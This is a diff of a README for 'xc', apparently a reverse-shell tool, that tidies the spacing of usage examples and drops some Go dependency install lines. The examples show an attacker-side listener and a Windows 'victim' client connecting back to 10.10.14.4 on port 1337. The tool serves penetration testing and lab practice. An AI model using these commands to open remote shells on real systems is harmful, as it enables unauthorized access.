@@ -80,9 +80,9 @@ Usage:
 
 ## Examples
 
-- Linux Attacker:	  `rlwrap xc -l -p 1337`			(Server)
-- WindowsVictim :   `xc.exe 10.10.14.4 1337`	  (Client)
-- Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)
+- Linux Attacker:   `rlwrap xc -l -p 1337`	(Server)
+- WindowsVictim :   `xc.exe 10.10.14.4 1337`	(Client)
+- Argumentless:	    `xc_10.10.14.4_1337.exe`	(Client)
 
 ## Setup
 
@@ -90,11 +90,6 @@ Make sure you are running golang version 1.15+, older versions will not compile.
 
 ``` 
 git clone --recurse-submodules https://github.com/xct/xc.git
-
-GO111MODULE=off go get golang.org/x/sys/...
-GO111MODULE=off go get golang.org/x/text/encoding/unicode
-GO111MODULE=off go get github.com/hashicorp/yamux
-GO111MODULE=off go get github.com/libp2p/go-reuseport
 sudo apt-get install rlwrap upx
 ``` 
 
